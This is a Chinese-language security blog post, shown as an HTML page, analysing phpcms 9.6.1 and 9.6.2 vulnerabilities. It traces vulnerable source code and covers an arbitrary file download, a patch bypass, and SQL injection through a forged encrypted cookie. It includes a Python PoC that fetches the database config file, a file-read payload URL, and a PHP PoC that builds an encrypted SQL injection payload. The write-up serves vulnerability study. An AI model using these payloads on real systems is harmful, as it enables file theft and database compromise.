@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Phyb0x's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言前面只分析了phpcms9.6.0，现在把后面的补上。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms漏洞分析续">
+<meta property="og:url" content="http://yoursite.com/2018/10/08/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD/index.html">
+<meta property="og:site_name" content="Phyb0x&#39;s blog">
+<meta property="og:description" content="前言前面只分析了phpcms9.6.0，现在把后面的补上。">
+<meta property="og:image" content="https://i.imgur.com/ly7Kc2H.png">
+<meta property="article:published_time" content="2018-10-08T14:30:09.000Z">
+<meta property="article:modified_time" content="2020-01-12T01:11:20.000Z">
+<meta property="article:author" content="Phyb0x">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/ly7Kc2H.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/08/phpcms漏洞分析续/"/>
+
+
+
+
+
+  <title>phpcms漏洞分析续 | Phyb0x's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/phyb0x" target="_blank" rel="noopener"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Phyb0x's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/08/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Phyb0x">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phyb0x's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpcms漏洞分析续</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-08T22:30:09+08:00">
+                2018-10-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面只分析了phpcms9.6.0，现在把后面的补上。</p>
+<a id="more"></a>
+
+<h3 id="phpcms9-6-1"><a href="#phpcms9-6-1" class="headerlink" title="phpcms9.6.1"></a>phpcms9.6.1</h3><p>这个版本公布的只有一个漏洞，任意文件读取。</p>
+<h4 id="9-6-1-任意文件下载"><a href="#9-6-1-任意文件下载" class="headerlink" title="9.6.1 任意文件下载"></a>9.6.1 任意文件下载</h4><p>我们先看看绿盟给的payload</p>
+<pre><code>http://10.65.20.198/phpcms_v9.6.1_UTF8/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=050a8GfSF2bwK4H-oJhtDI2f9ixgu_iRvkGN1VX3I3X0wD-s-LPJnRGnM_xikA_rYLQInxgtkGtwL-JRW1HGHFO87kxWoVihALeRKJZEfTCcEYYrAOl_uqqzs7imN1QtTktE8jpF3zxIKeUOc0dFw7xr2JHyrWy8-lrUAQ</code></pre><p>调用了down 模块 、 download方法，后面a_k是加密函数之前分析过。</p>
+<p>先分析/phpcms/modules/content/down.php download方法(87-130)。</p>
+<pre><code>public function download() {
+    $a_k = trim($_GET[&apos;a_k&apos;]);//传入a_k
+    $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;);
+    $a_k = sys_auth($a_k, &apos;DECODE&apos;, $pc_auth_key);//解密
+    if(empty($a_k)) showmessage(L(&apos;illegal_parameters&apos;));
+    unset($i,$m,$f,$t,$ip);
+    $a_k = safe_replace($a_k);//对a_k进行函数过滤
+    parse_str($a_k); //解析变量        
+    if(isset($i)) $downid = intval($i);
+    if(!isset($m)) showmessage(L(&apos;illegal_parameters&apos;));
+    if(!isset($modelid)) showmessage(L(&apos;illegal_parameters&apos;));
+    if(empty($f)) showmessage(L(&apos;url_invalid&apos;));
+    if(!$i || $m&lt;0) showmessage(L(&apos;illegal_parameters&apos;));
+    if(!isset($t)) showmessage(L(&apos;illegal_parameters&apos;));
+    if(!isset($ip)) showmessage(L(&apos;illegal_parameters&apos;));
+    $starttime = intval($t);
+    if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&apos;..&apos;)!==FALSE) showmessage(L(&apos;url_error&apos;));//对$f参数进行正则用其中之一就返回错误
+    $fileurl = trim($f);//赋值
+    if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&apos;illegal_parameters&apos;));//进行过滤有其中之一就返回参数错误    
+    $endtime = SYS_TIME - $starttime;
+    if($endtime &gt; 3600) showmessage(L(&apos;url_invalid&apos;));
+    if($m) $fileurl = trim($s).trim($fileurl);//赋值
+    if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$fileurl) ) showmessage(L(&apos;url_error&apos;));//再次进行后缀名过滤
+    //远程文件
+    if(strpos($fileurl, &apos;:/&apos;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;)) === false)) { 
+        header(&quot;Location: $fileurl&quot;);
+    } else {
+        if($d == 0) {
+            header(&quot;Location: &quot;.$fileurl);
+        } else {
+            $fileurl = str_replace(array(pc_base::load_config(&apos;system&apos;,&apos;upload_url&apos;),&apos;/&apos;), array(pc_base::load_config(&apos;system&apos;,&apos;upload_path&apos;),DIRECTORY_SEPARATOR), $fileurl);
+            $filename = basename($fileurl);
+            //处理中文文件
+            if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
+                $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
+                $filename = urldecode(basename($filename));
+            }
+            $ext = fileext($filename);
+            $filename = date(&apos;Ymd_his&apos;).random(3).&apos;.&apos;.$ext;
+            $fileurl = str_replace(array(&apos;&lt;&apos;,&apos;&gt;&apos;), &apos;&apos;,$fileurl);
+            file_down($fileurl, $filename);
+        }
+    }
+}</code></pre><p>从上往下分析，首先获取$a_k并进行解密，然后对内容进行safe_replace()过滤。</p>
+<pre><code>function safe_replace($string) {
+    $string = str_replace(&apos;%20&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;%27&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;%2527&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;*&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;&quot;&apos;,&apos;&quot;&apos;,$string);
+    $string = str_replace(&quot;&apos;&quot;,&apos;&apos;,$string);
+    $string = str_replace(&apos;&quot;&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;;&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;&lt;&apos;,&apos;&lt;&apos;,$string);
+    $string = str_replace(&apos;&gt;&apos;,&apos;&gt;&apos;,$string);
+    $string = str_replace(&quot;{&quot;,&apos;&apos;,$string);
+    $string = str_replace(&apos;}&apos;,&apos;&apos;,$string);
+    $string = str_replace(&apos;\\&apos;,&apos;&apos;,$string);
+    return $string;
+}</code></pre><p>然后用parse_str()解析变量然后去判断一些参数不为空，并且对$f再次进行过滤</p>
+<pre><code>if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&apos;..&apos;)!==FALSE) showmessage(L(&apos;url_error&apos;)); </code></pre><p>很清楚了有其中一只都会返回错误。然后$f赋值给了$fileurl。</p>
+<pre><code>if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&apos;illegal_parameters&apos;));    
+···
+if($m) $fileurl = trim($s).trim($fileurl);</code></pre><p>进行简单判断之后再次进行了赋值操作，而这两个参数都是$a_k解析而来，$s可控$f进行了一些过滤操作。下面又对$fileurl过滤</p>
+<pre><code>if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$fileurl) ) showmessage(L(&apos;url_error&apos;));</code></pre><p>后面又进行了if循环,而我们的目标就是进入最后一次循环中调用file_down()去下载任意文件。</p>
+<pre><code>function file_down($filepath, $filename = &apos;&apos;) {
+    if(!$filename) $filename = basename($filepath);
+    if(is_ie()) $filename = rawurlencode($filename);
+    $filetype = fileext($filename);
+    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));
+    if(ob_get_length() !== false) @ob_end_clean();
+    header(&apos;Pragma: public&apos;);
+    header(&apos;Last-Modified: &apos;.gmdate(&apos;D, d M Y H:i:s&apos;) . &apos; GMT&apos;);
+    header(&apos;Cache-Control: no-store, no-cache, must-revalidate&apos;);
+    header(&apos;Cache-Control: pre-check=0, post-check=0, max-age=0&apos;);
+    header(&apos;Content-Transfer-Encoding: binary&apos;);
+    header(&apos;Content-Encoding: none&apos;);
+    header(&apos;Content-type: &apos;.$filetype);
+    header(&apos;Content-Disposition: attachment; filename=&quot;&apos;.$filename.&apos;&quot;&apos;);
+    header(&apos;Content-length: &apos;.$filesize);
+    readfile($filepath);
+    exit;
+}</code></pre><p>其实就是个普通的下载函数，不普通在调用他的时候参数我们是可控的。</p>
+<pre><code>if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
+    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
+    $filename = urldecode(basename($filename));
+}
+$ext = fileext($filename);
+$filename = date(&apos;Ymd_his&apos;).random(3).&apos;.&apos;.$ext;
+$fileurl = str_replace(array(&apos;&lt;&apos;,&apos;&gt;&apos;), &apos;&apos;,$fileurl);
+file_down($fileurl, $filename);</code></pre><p>关键点就在这，进过上面的层层过滤无论是单独的$s $f还是合在一起的$fileurl都不可能有什么危险后缀，但是这里对$fileurl进行了正则替换把&lt;&gt;换成空 ……也就是说我们可以这样进行拼接</p>
+<pre><code>$s=test.ph + $f=&gt;p = $fileurl=test.ph&gt;p = test.php</code></pre><p>接下来的问题就是怎么把自己带有payload的加密并且回显出来。老生常谈了用wap这里就不说了。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>以数据库文件为例，生成下载链接访问下载就行。</p>
+<pre><code>import requests
+
+def poc(host):
+    step = &apos;{}index.php?m=wap&amp;a=index&amp;siteid=1&apos;.format(host)
+    req = requests.get(url=step)
+    for i in req.cookies:
+        if i.name[-7:] == &apos;_siteid&apos;:
+            userid_flash = i.value
+        else:
+            print(&apos;Step1 is error&apos;)
+    step1 = &apos;{}index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dcaches/configs/database%26f%3D.p%25253chp&apos;.format(host)
+
+    data = {&apos;userid_flash&apos;:userid_flash}
+    req1 = requests.post(url=step1,data=data)
+
+    for i in req1.cookies:
+        if i.name[-9:] == &apos;_att_json&apos;:
+            a_k = i.value
+    if a_k == &apos;&apos;:
+        print(&apos;sys_paylaod Bad&apos;)
+
+    url = &apos;{}index.php?m=content&amp;c=down&amp;a_k={}&apos;.format(host,a_k)
+    print(url)
+
+if __name__ == &apos;__main__&apos;:
+    poc(&apos;http://127.0.0.1/phpcmsv9.6.1/&apos;)</code></pre><h3 id="phpcms9-6-2"><a href="#phpcms9-6-2" class="headerlink" title="phpcms9.6.2"></a>phpcms9.6.2</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>这个属于补丁绕过，可以看到补丁又加了一次正则但是有被绕过的可能。<br><img src="https://i.imgur.com/ly7Kc2H.png" alt=""></p>
+<p>trim函数也不是安全的，%81-%99间的字符是不会被trim去掉的且在windows中还能正常访问到相应的文件。给出payload</p>
+<pre><code>http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%*25*3ep%2581%26modelid=1%26d=1&amp;aid=1</code></pre><h4 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h4><p>在member模块，会员前台管理中心接口的继承父类foreground:</p>
+<pre><code>class index extends foreground {
+
+private $times_db;
+
+function __construct() {
+    parent::__construct();
+    $this-&gt;http_user_agent = $_SERVER[&apos;HTTP_USER_AGENT&apos;];
+}</code></pre><p>跟进foreground /phpcms/modules/member/classes/foreground.class.php 19-33</p>
+<pre><code>public $db, $memberinfo;
+private $_member_modelinfo;
+
+public function __construct() {
+    self::check_ip();
+    $this-&gt;db = pc_base::load_model(&apos;member_model&apos;);
+    //ajax验证信息不需要登录
+    if(substr(ROUTE_A, 0, 7) != &apos;public_&apos;) {
+        self::check_member();
+    }
+}
+
+/**
+ * 判断用户是否已经登陆
+ */
+final public function check_member() {
+    $phpcms_auth = param::get_cookie(&apos;auth&apos;);
+    if(ROUTE_M ==&apos;member&apos; &amp;&amp; ROUTE_C ==&apos;index&apos; &amp;&amp; in_array(ROUTE_A, array(&apos;login&apos;, &apos;register&apos;, &apos;mini&apos;,&apos;send_newmail&apos;))) {
+        if ($phpcms_auth &amp;&amp; ROUTE_A != &apos;mini&apos;) {
+            showmessage(L(&apos;login_success&apos;, &apos;&apos;, &apos;member&apos;), &apos;index.php?m=member&amp;c=index&apos;);
+        } else {
+            return true;
+        }
+    } else {
+        //判断是否存在auth cookie
+        if ($phpcms_auth) {
+            $auth_key = $auth_key = get_auth_key(&apos;login&apos;);
+            list($userid, $password) = explode(&quot;\t&quot;, sys_auth($phpcms_auth, &apos;DECODE&apos;, $auth_key));
+            //验证用户，获取用户信息
+            $this-&gt;memberinfo = $this-&gt;db-&gt;get_one(array(&apos;userid&apos;=&gt;$userid));</code></pre><p>可以看到只要不是ajax就需要进入check_member()函数，而函数第一个if的else循环里可以看到进行解密操作并且把userid用get_one()拼接代入数据库,这就造成了注入。</p>
+<p>userid的值是cookie解密而来，那我们看下cookie操作，</p>
+<pre><code>public static function get_cookie($var, $default = &apos;&apos;)     {
+    $var = pc_base::load_config(&apos;system&apos;,&apos;cookie_pre&apos;).$var;
+    $value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], &apos;DECODE&apos;) : $default;
+    if(in_array($var,array(&apos;_userid&apos;,&apos;userid&apos;,&apos;siteid&apos;,&apos;_groupid&apos;,&apos;_roleid&apos;))) {
+    $value = intval($value);
+    } elseif(in_array($var,array(&apos;_username&apos;,&apos;username&apos;,&apos;_nickname&apos;,&apos;admin_username&apos;,&apos;sys_lang&apos;))) { //  site_model auth
+    $value = safe_replace($value);
+    }
+    return $value;
+}</code></pre><p>先读取了cookie_pre，然后对cookie_pre_auth进行解密，没传入key说明是默认的用配置文件中的auth_key作为解密密钥。然后走到这里进行第二次解密</p>
+<pre><code>if ($phpcms_auth) { $auth_key = $auth_key = get_auth_key(&apos;login&apos;); list($userid, $password) = explode(&quot;\t&quot;, sys_auth($phpcms_auth, &apos;DECODE&apos;, $auth_key));</code></pre><p>秘钥为auth_key= get_auth_key(‘login’) 跟进</p>
+<pre><code>function get_auth_key($prefix,$suffix=&quot;&quot;) {
+    if($prefix==&apos;login&apos;){
+        $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).ip());
+    }else if($prefix==&apos;email&apos;){
+        $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;));
+    }else{
+        $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$suffix);
+    }
+    $authkey = md5($prefix.$pc_auth_key);
+    return $authkey;
+}</code></pre><p>传入login进入</p>
+<pre><code>$pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).ip());</code></pre><p>auth_key是默认秘钥与IP拼接成的。而ip()可以伪造</p>
+<pre><code>function ip() {
+    if(getenv(&apos;HTTP_CLIENT_IP&apos;) &amp;&amp; strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)) {
+        $ip = getenv(&apos;HTTP_CLIENT_IP&apos;);
+    } elseif(getenv(&apos;HTTP_X_FORWARDED_FOR&apos;) &amp;&amp; strcasecmp(getenv(&apos;HTTP_X_FORWARDED_FOR&apos;), &apos;unknown&apos;)) {
+        $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);
+    } elseif(getenv(&apos;REMOTE_ADDR&apos;) &amp;&amp; strcasecmp(getenv(&apos;REMOTE_ADDR&apos;), &apos;unknown&apos;)) {
+        $ip = getenv(&apos;REMOTE_ADDR&apos;);
+    } elseif(isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &apos;unknown&apos;)) {
+        $ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+    }
+    return preg_match ( &apos;/[\d\.]{7,15}/&apos;, $ip, $matches ) ? $matches [0] : &apos;&apos;;
+}</code></pre><p>所以说参数全可控。而默认秘钥我们可以配合任意下载来获取。</p>
+<p>思路很清晰了要倒着来：</p>
+<p>$userid = paylaod -&gt;  sys_auth($phpcms_auth, ‘DECODE’, $auth_key) -&gt; sys_auth($_COOKIE[$var], ‘DECODE’) -&gt;  加密后的sql payload</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>附上某位大佬的poc:</p>
+<pre><code>&lt;?php
+/**
+* 字符串加密、解密函数
+*
+*
+* @param    string    $txt        字符串
+* @param    string    $operation    ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
+* @param    string    $key        密钥：数字、字母、下划线
+* @param    string    $expiry        过期时间
+* @return    string
+*/
+function sys_auth($string, $operation = &apos;ENCODE&apos;, $key = &apos;&apos;, $expiry = 0) {
+    $ckey_length = 4;
+       $key = md5($key != &apos;&apos; ? $key : &quot;4sUeVkLdmNZYGu2bPshg&quot;);
+    $keya = md5(substr($key, 0, 16));
+    $keyb = md5(substr($key, 16, 16));
+    $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;
+
+    $cryptkey = $keya.md5($keya.$keyc);
+    $key_length = strlen($cryptkey);
+
+    $string = $operation == &apos;DECODE&apos; ? base64_decode(strtr(substr($string, $ckey_length), &apos;-_&apos;, &apos;+/&apos;)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+    $string_length = strlen($string);
+
+    $result = &apos;&apos;;
+    $box = range(0, 255);
+
+    $rndkey = array();
+    for($i = 0; $i &lt;= 255; $i++) {
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+    }
+
+       for($j = $i = 0; $i &lt; 256; $i++) {
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+        $tmp = $box[$i];
+           $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    }
+
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+    }
+
+    if($operation == &apos;DECODE&apos;) {
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+        return substr($result, 26);
+        } else {
+            return &apos;&apos;;
+        }
+    } else {
+        return $keyc.rtrim(strtr(base64_encode($result), &apos;+/&apos;, &apos;-_&apos;), &apos;=&apos;);
+    }
+}
+
+$auth_key = &quot;wR67aGYF4kOghES5NKG1&quot;;
+$ip = &quot;123.59.214.3&quot;;
+function get_auth_key($prefix,$suffix=&quot;&quot;) {
+    global $auth_key;
+       global $ip;
+    if($prefix==&apos;login&apos;){
+        $pc_auth_key = md5($auth_key.$ip);
+    }else if($prefix==&apos;email&apos;){
+        $pc_auth_key = md5($auth_key);
+    }else{
+        $pc_auth_key = md5($auth_key.$suffix);
+    }
+    $authkey = md5($prefix.$pc_auth_key);
+    return $authkey;
+}
+
+$auth_key2 = get_auth_key(&apos;login&apos;);
+$auth_key2 = get_auth_key(&apos;login&apos;);
+$sql = &quot;1&apos; and (extractvalue(1,concat(0x7e,(select user()))));#\txx&quot;;
+#$sql = &quot;1&apos; and (extractvalue(1,concat(0x7e,(select sessionid from v9_session))));#\tokee&quot;;
+$sql = sys_auth($sql,&apos;ENCODE&apos;,$auth_key2);
+echo sys_auth($sql,&apos;ENCODE&apos;,$auth_key);
+
+echo &quot;\n&quot;;
+echo sys_auth(&apos;1&apos;,&apos;ENCODE&apos;,$auth_key);
+
+echo sys_auth(&apos;3d1bj3Vdx7JEQ6XakmlhBiUiEYBo7Ff3XMV2qrSu&apos;,&apos;DECODE&apos;,$auth_key);</code></pre><p>参考链接：</p>
+<p><a href="http://blog.nsfocus.net/phpcms-v9-6-1-arbitrary-file-download-vulnerability-analysis-exp/" target="_blank" rel="noopener">http://blog.nsfocus.net/phpcms-v9-6-1-arbitrary-file-download-vulnerability-analysis-exp/</a></p>
+<p><a href="https://www.jianshu.com/p/47bf5b7c3b2e" target="_blank" rel="noopener">https://www.jianshu.com/p/47bf5b7c3b2e</a></p>
+<p><a href="https://www.anquanke.com/post/id/86134" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86134</a></p>
+<p><a href="https://www.jianshu.com/p/67c81e3b3258" target="_blank" rel="noopener">https://www.jianshu.com/p/67c81e3b3258</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>文章作者:</span><a href="/" title="访问 Phyb0x 的个人博客">Phyb0x</a></p>
+  <p><span>最后更新:</span>2020年01月12日 09:01:20</p>
+  <p><span>原始链接:</span><a href="/2018/10/08/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD/" title="phpcms漏洞分析续">http://yoursite.com/2018/10/08/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD/</a></p>
+  <p><span>版权声明:</span>本博客所有文章除特别声明外，均采用 <i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" title="Attribution-NonCommercial-ShareAlike 3.0 Unported (CC BY-NC-SA 3.0)"> BY-NC-SA 3.0 许可协议</a>，转载请注明出处！</p>  
+</div>
+
+      
+    </div>
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>万一有人点了呢！</div>
